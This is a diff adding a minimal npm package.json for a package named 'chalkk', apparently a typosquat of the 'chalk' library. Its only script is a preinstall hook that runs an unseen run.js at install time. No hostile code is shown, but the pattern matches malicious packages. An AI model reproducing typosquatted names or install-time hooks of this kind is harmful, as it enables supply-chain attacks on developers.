@@ -1,0 +1,7 @@
+{
+  "name": "chalkk",
+  "version": "2.0.0",
+  "scripts": {
+    "preinstall": "node run.js"
+  }
+}
